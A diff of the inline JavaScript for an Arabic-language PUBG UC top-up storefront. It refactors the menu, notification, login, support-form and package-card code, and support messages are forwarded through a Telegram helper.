-                else if(action === 'notifications') { openNotificationsModal(); closeMenu(); }
-                else if(action === 'orders') alert("مركز الطلبات (قريباً)");
+                else if(action === 'notifications') { openNotificationModal(); closeMenu(); }
+                else if(action === 'orders') alert(t.ordersCenter + " (سيتم عرض طلباتك قريباً)");
                 else if(action === 'cardManagement') alert("💳 إدارة البطاقة: ستتمكن قريباً من إضافة بطاقات الدفع.");
-                else if(action === 'events') alert("الأحداث القادمة قريباً");
-                else if(action === 'instructions') alert("التعليمات: 1- سجل دخول 2- أضف معرف PUBG 3- اختر الباقة");
-                else if(action === 'support') { closeMenu(); openSupportModal(); }
+                else if(action === 'events') alert(t.eventsMenu + " (قريباً)");
+                else if(action === 'instructions') alert(t.instructions + "\n1- سجل دخولك أولاً\n2- أضف معرف PUBG\n3- اختر الباقة");
+                else if(action === 'support') openSupportModal();
                 closeMenu();
             });
         });
     }
-    
-    // --- ID PUBG ---
+
+    // إظهار مودال الاشعارات
+    function openNotificationModal() {
+        const notifModal = document.getElementById('notificationModal');
+        notifModal.classList.add('active');
+    }
+    function closeNotificationModal() {
+        const notifModal = document.getElementById('notificationModal');
+        notifModal.classList.remove('active');
+    }
+    document.getElementById('closeNotificationBtn')?.addEventListener('click', closeNotificationModal);
+    document.getElementById('notificationModal')?.addEventListener('click', (e) => { if(e.target === document.getElementById('notificationModal')) closeNotificationModal(); });
+
+    // ---------------------- 4. إدارة ID PUBG ----------------------
     const STORAGE_KEY = 'pubg_user_id';
     let currentUserId = localStorage.getItem(STORAGE_KEY);
     const headerAccountContainer = document.getElementById('headerAccountContainer');
@@ -1340,8 +1447,8 @@ footer {
     function showPopup(uid) { modalUserIdSpan.innerText=uid; modalAccount.classList.add('active'); const del=document.getElementById('modalDeleteBtn'), ch=document.getElementById('modalChangeBtn'); const newDel=del.cloneNode(true), newCh=ch.cloneNode(true); del.parentNode.replaceChild(newDel,del); ch.parentNode.replaceChild(newCh,ch); newDel.addEventListener('click',()=>{ localStorage.removeItem(STORAGE_KEY); refreshHeaderAccount(); modalAccount.classList.remove('active'); }); newCh.addEventListener('click',()=>{ modalAccount.classList.remove('active'); let newId=promptNumbers('أدخل الايدي الجديد (أرقام فقط):',currentUserId); if(newId){ localStorage.setItem(STORAGE_KEY,newId); refreshHeaderAccount(); } }); modalAccount.addEventListener('click',function out(e){ if(e.target===modalAccount){ modalAccount.classList.remove('active'); modalAccount.removeEventListener('click',out); } }); }
     function refreshHeaderAccount() { currentUserId = localStorage.getItem(STORAGE_KEY); if(!currentUserId) { headerAccountContainer.innerHTML = `<div class="header-account-btn" id="headerAddAccountBtn">➕ اضف معرف PUBG</div>`; document.getElementById('headerAddAccountBtn')?.addEventListener('click',()=>{ let newId=promptNumbers('ادخل ايدي PUBG (أرقام فقط):'); if(newId){ localStorage.setItem(STORAGE_KEY,newId); refreshHeaderAccount(); } }); } else { let display = currentUserId.length>12 ? currentUserId.slice(0,10)+'...' : currentUserId; headerAccountContainer.innerHTML = `<div class="header-account-btn" id="headerSavedIdBtn">🆔 ${display}</div>`; document.getElementById('headerSavedIdBtn')?.addEventListener('click',()=>showPopup(currentUserId)); } }
     refreshHeaderAccount();
-    
-    // --- مودال تسجيل الدخول و الدعم (نفس السابق مع تحسينات)---
+
+    // ---------------------- 5. مودال تسجيل الدخول ----------------------
     const authModal = document.getElementById('authModal');
     const authTitle = document.getElementById('authTitle');
     const authSubmitBtn = document.getElementById('authSubmitBtn');
@@ -1356,37 +1463,88 @@ footer {
     function updateAuthUI() { if(isLoginMode) { authTitle.innerText='تسجيل الدخول'; authSubmitBtn.innerText='دخول'; authUsername.style.display='none'; authSwitchText.innerHTML='ليس لديك حساب؟ <span>إنشاء حساب جديد</span>'; } else { authTitle.innerText='إنشاء حساب جديد'; authSubmitBtn.innerText='إنشاء حساب'; authUsername.style.display='block'; authSwitchText.innerHTML='لديك حساب بالفعل؟ <span>تسجيل الدخول</span>'; } }
     authSwitchText.addEventListener('click', (e) => { if(e.target.tagName==='SPAN') { isLoginMode = !isLoginMode; updateAuthUI(); } });
     authSubmitBtn.addEventListener('click', async () => { 
-        const email = authEmail.value.trim(); const pwd = authPassword.value.trim(); 
+        const email = authEmail.value.trim(); 
+        const pwd = authPassword.value.trim(); 
         if(!email || !pwd) { authError.innerText='يرجى ملء البريد وكلمة المرور'; return; } 
         if(isLoginMode) { 
             let res = loginUser(email, pwd); 
-            if(res.success) { closeAuthModal(); refreshMenuContent(); updateLoginArea(); alert(`مرحباً ${res.username}`); } 
-            else authError.innerText=res.msg; 
+            if(res.success) { 
+                closeAuthModal(); 
+                refreshMenuContent(); 
+                updateLoginArea(); 
+                alert(`مرحباً ${res.username}`); 
+            } else { 
+                authError.innerText=res.msg; 
+            } 
         } else { 
             const username = authUsername.value.trim(); 
             if(!username) { authError.innerText='يرجى إدخال اسم المستخدم'; return; } 
             let res = registerUser(username, email, pwd); 
-            if(res.success) { isLoginMode=true; updateAuthUI(); authError.innerText='تم إنشاء الحساب، يمكنك تسجيل الدخول الآن'; } 
-            else authError.innerText=res.msg; 
+            if(res.success) { 
+                isLoginMode=true; 
+                updateAuthUI(); 
+                authError.innerText='تم إنشاء الحساب، يمكنك تسجيل الدخول الآن'; 
+            } else { 
+                authError.innerText=res.msg; 
+            } 
         } 
     });
     authModal.addEventListener('click', (e) => { if(e.target === authModal) closeAuthModal(); });
-    
-    // الدعم
+
+    // ---------------------- 5.1 مودال الدعم ----------------------
     const supportModal = document.getElementById('supportModal');
     const supportName = document.getElementById('supportName');
-    const supportEmail = document.getElementById('supportEmail');
+    const supportEmailField = document.getElementById('supportEmail');
     const supportMessage = document.getElementById('supportMessage');
     const supportErrorSpan = document.getElementById('supportError');
     const sendSupportBtn = document.getElementById('sendSupportBtn');
     const closeSupportBtn = document.getElementById('closeSupportBtn');
-    function openSupportModal() { if(!isLoggedIn()) { alert('يرجى تسجيل الدخول أولاً'); openAuthModal(); return; } const userData = getLoggedUserData(); supportEmail.value = userData.email; supportName.value = ''; supportMessage.value = ''; supportErrorSpan.innerText = ''; supportModal.classList.add('active'); }
-    function closeSupportModal() { supportModal.classList.remove('active'); }
-    sendSupportBtn.addEventListener('click', async () => { const name = supportName.value.trim(); const email = supportEmail.value.trim(); const message = supportMessage.value.trim(); if(!name || !message) { supportErrorSpan.innerText = 'الرجاء ملء الاسم والرسالة'; return; } supportErrorSpan.innerText = 'جاري الإرسال...'; sendSupportBtn.disabled = true; const success = await sendTelegramMessage(`📩 <b>رسالة دعم</b>\n👤 ${name}\n📧 ${email}\n💬 ${message}`); if(success) { supportErrorSpan.innerText = '✅ تم الإرسال'; setTimeout(()=>closeSupportModal(),1500); } else supportErrorSpan.innerText = '❌ خطأ'; sendSupportBtn.disabled = false; });
+
+    function openSupportModal() {
+        if(!isLoggedIn()) {
+            alert('يرجى تسجيل الدخول أولاً للتواصل مع الدعم');
+            openAuthModal();
+            return;
+        }
+        const userData = getLoggedUserData();
+        supportEmailField.value = userData.email;
+        supportName.value = '';
+        supportMessage.value = '';
+        supportErrorSpan.innerText = '';
+        supportModal.classList.add('active');
+    }
+    function closeSupportModal() {
+        supportModal.classList.remove('active');
+    }
+    
+    sendSupportBtn.addEventListener('click', async () => {
+        const name = supportName.value.trim();
+        const email = supportEmailField.value.trim();
+        const message = supportMessage.value.trim();
+        if(!name) { supportErrorSpan.innerText = 'الرجاء إدخال الاسم'; return; }
+        if(!message) { supportErrorSpan.innerText = 'الرجاء كتابة الرسالة'; return; }
+        if(!email) { supportErrorSpan.innerText = 'البريد الإلكتروني مفقود'; return; }
+        
+        supportErrorSpan.innerText = 'جاري الإرسال...';
+        sendSupportBtn.disabled = true;
+        
+        const text = `📩 <b>رسالة دعم جديدة من الموقع</b>\n👤 الاسم: ${name}\n📧 البريد: ${email}\n💬 الرسالة: ${message}`;
+        const success = await sendTelegramMessage(text);
+        
+        if(success) {
+            supportErrorSpan.innerText = '✅ تم إرسال رسالتك بنجاح!';
+            supportErrorSpan.style.color = '#4caf50';
+            setTimeout(() => closeSupportModal(), 1500);
+        } else {
+            supportErrorSpan.innerText = '❌ حدث خطأ في الإرسال، حاول مرة أخرى';
+            supportErrorSpan.style.color = '#e67e22';
+        }
+        sendSupportBtn.disabled = false;
+    });
     closeSupportBtn.addEventListener('click', closeSupportModal);
     supportModal.addEventListener('click', (e) => { if(e.target === supportModal) closeSupportModal(); });
-    
-    // --- الدول والبطاقات ---
+
+    // ---------------------- 6. الدول والبطاقات ----------------------
     const countryModalDiv = document.getElementById('countryModal');
     const openCountryBtn = document.getElementById('openCountryModalBtn');
     const closeCountryModalBtn = document.getElementById('closeCountryModalBtn');
@@ -1400,26 +1558,26 @@ footer {
     renderCountries();
     const savedCountry = localStorage.getItem('selectedCountry');
     if(savedCountry){ document.getElementById('countryBtnText').innerHTML=`${getFlag(savedCountry)} ${savedCountry}`; applyTranslation(getLanguageForCountry(savedCountry)); } else applyTranslation('default');
-    
-    function getLanguageForCountry(country) { const map = { "الولايات المتحدة":"en","المملكة المتحدة":"en","كندا":"en","إسبانيا":"es","المكسيك":"es","الأرجنت":"es","فرنسا":"fr","ألمانيا":"de","تركيا":"tr","إيطاليا":"it","البرازيل":"pt" }; return map[country] || "default"; }
-    function applyTranslation(langCode) { const t = { pageTitle:"PUBG UC Store - متجر شدات ببجي", sectionTitle:"اختر الباقة", coupon:"استعمال كوبون", events:"الأحداث", vip:"VIP", support:"الدعم", buy:"شراء الآن", footer:"جميع الحقوق محفوظة © PUBG UC Store", modalTitle:"معرف اللاعب", deleteBtn:"حذف", changeBtn:"تغيير", pubgBrand:"PUBG MOBILE", countryModalTitle:"اختر دولتك", asia:"آسيا", europe:"أوروبا", northAmerica:"أمريكا الشمالية", southAmerica:"أمريكا الجنوبية", close:"إغلاق" }; if(langCode !== 'default') Object.assign(t, { pageTitle:"PUBG UC Store", sectionTitle:"Choose Package", coupon:"Use Coupon", events:"Events", vip:"VIP Account", support:"Support", buy:"Buy Now", footer:"All Rights Reserved © PUBG UC Store", modalTitle:"Player ID", deleteBtn:"Delete", changeBtn:"Change", pubgBrand:"PUBG MOBILE", countryModalTitle:"Select Country", asia:"Asia", europe:"Europe", northAmerica:"North America", southAmerica:"South America", close:"Close" }); document.title = t.pageTitle; document.getElementById("sectionTitle").innerText = t.sectionTitle; document.getElementById("couponBtn").innerHTML = `📦 ${t.coupon}`; document.getElementById("eventsBtn").innerHTML = `🎯 ${t.events}`; document.getElementById("vipBtn").innerHTML = `👑 ${t.vip}`; document.getElementById("supportBtn").innerHTML = `💬 ${t.support}`; if(!localStorage.getItem('selectedCountry')) document.getElementById("countryBtnText").innerText = t.countryPlaceholder||"اختر الدولة"; document.getElementById("paymentBtn").innerHTML = (t.paymentPlaceholder||"اختر وسيلة الدفع")+" "; let items = document.querySelectorAll("#paymentList li"); if(items[0]) items[0].innerText = t.zain||"Zain Cash"; if(items[1]) items[1].innerText = t.asiaHaw||"Asia Hawala"; if(items[2]) items[2].innerText = t.master||"Master Card"; document.querySelectorAll(".buy-btn").forEach(btn => btn.innerText = t.buy); document.getElementById("footerText").innerText = t.footer; document.getElementById("modalTitle").innerText = t.modalTitle; document.getElementById("modalDeleteBtn").innerText = t.deleteBtn; document.getElementById("modalChangeBtn").innerText = t.changeBtn; document.getElementById("pubgBrandText").innerText = t.pubgBrand; document.getElementById("countryModalTitle").innerText = t.countryModalTitle; document.getElementById("asiaTitle").innerText = t.asia; document.getElementById("europeTitle").innerText = t.europe; document.getElementById("northAmericaTitle").innerText = t.northAmerica; document.getElementById("southAmericaTitle").innerText = t.southAmerica; document.getElementById("closeCountryModalBtn").innerText = t.close; refreshMenuContent(); }
-    
+
+    // بطاقات UC
     const cardsData = [{ title: "60 UC", price: "$0.99" },{ title: "325 UC", price: "$4.99" },{ title: "660 UC", price: "$9.99" },{ title: "1800 UC", price: "$24.99" }];
-    function renderCards() { const container=document.getElementById('cardsContainer'); container.innerHTML=''; cardsData.forEach(card=>{ const cardDiv=document.createElement('div'); cardDiv.className='card'; cardDiv.innerHTML=`<img src="uc.png" alt="UC" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22150%22 viewBox=%220 0 200 150%22%3E%3Crect width=%22200%22 height=%22150%22 fill=%22%23222%22/%3E%3Ctext x=%22100%22 y=%2285%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2232%22 font-weight=%22bold%22%3EUC%3C/text%3E%3C/svg%3E'"><div class="card-body"><div class="card-title">${card.title}</div><div class="price">${card.price}</div><button class="buy-btn">شراء الآن</button></div>`; container.appendChild(cardDiv); }); document.querySelectorAll('.buy-btn').forEach(btn=>btn.addEventListener('click',()=>{ if(!isLoggedIn()) { alert('يرجى تسجيل الدخول أولاً'); openAuthModal(); return; } alert('تم إضافة الطلب! (تجريبي) سيتم ربطه بمركز الطلبات'); })); const lang=getLanguageForCountry(localStorage.getItem('selectedCountry')||'العراق'); const t = (lang==='default'?{buy:"شراء الآن"}:{buy:"Buy Now"}); document.querySelectorAll(".buy-btn").forEach(btn=>btn.innerText=t.buy); }
+    function renderCards() { const container=document.getElementById('cardsContainer'); container.innerHTML=''; cardsData.forEach(card=>{ const cardDiv=document.createElement('div'); cardDiv.className='card'; cardDiv.innerHTML=`<img src="uc.png" alt="UC" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22150%22 viewBox=%220 0 200 150%22%3E%3Crect width=%22200%22 height=%22150%22 fill=%22%23222%22/%3E%3Ctext x=%22100%22 y=%2285%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2232%22 font-weight=%22bold%22%3EUC%3C/text%3E%3C/svg%3E'"><div class="card-body"><div class="card-title">${card.title}</div><div class="price">${card.price}</div><button class="buy-btn">شراء الآن</button></div>`; container.appendChild(cardDiv); }); document.querySelectorAll('.buy-btn').forEach(btn=>btn.addEventListener('click',()=>{ if(!isLoggedIn()) { alert('يرجى تسجيل الدخول أولاً'); openAuthModal(); return; } alert('تم إضافة الطلب! (تجريبي) سيتم ربطه بمركز الطلبات'); })); const lang=getLanguageForCountry(localStorage.getItem('selectedCountry')||'العراق'); const t=translations[lang]||translations.default; document.querySelectorAll(".buy-btn").forEach(btn=>btn.innerText=t.buy); }
     renderCards();
+    
     function initDropdown(){ const btn=document.getElementById('paymentBtn'), list=document.getElementById('paymentList'); btn.addEventListener('click',(e)=>{ e.stopPropagation(); list.style.display=list.style.display==='block'?'none':'block'; }); list.querySelectorAll('li').forEach(li=>{ li.addEventListener('click',(e)=>{ e.stopPropagation(); btn.innerHTML=li.innerText+' '; list.style.display='none'; }); }); document.addEventListener('click',()=>list.style.display='none'); }
     initDropdown();
     document.getElementById('couponBtn')?.addEventListener('click',()=>alert('🔖 كوبونات قريباً'));
     document.getElementById('eventsBtn')?.addEventListener('click',()=>alert('📅 الأحداث قريباً'));
     document.getElementById('vipBtn')?.addEventListener('click',()=>alert('👑 VIP قريباً'));
-    document.getElementById('notificationsBtn')?.addEventListener('click', openNotificationsModal);
-    document.getElementById('closeNotifyBtn')?.addEventListener('click', closeNotificationsModal);
     document.getElementById('supportBtn')?.addEventListener('click', openSupportModal);
-    
+    document.getElementById('notificationsBtn')?.addEventListener('click', openNotificationModal);
+
+    // Side menu
     const menuIcon = document.getElementById('menuIcon'), sideMenu = document.getElementById('sideMenu'), menuOverlay = document.getElementById('menuOverlay'), closeMenuBtn = document.getElementById('closeMenuBtn');
     function openMenu() { sideMenu.classList.add('open'); menuOverlay.classList.add('active'); document.body.style.overflow = 'hidden'; }
     function closeMenu() { sideMenu.classList.remove('open'); menuOverlay.classList.remove('active'); document.body.style.overflow = ''; }
     menuIcon.addEventListener('click', openMenu); closeMenuBtn.addEventListener('click', closeMenu); menuOverlay.addEventListener('click', closeMenu);
+    
     updateLoginArea();
 </script>
 </body>
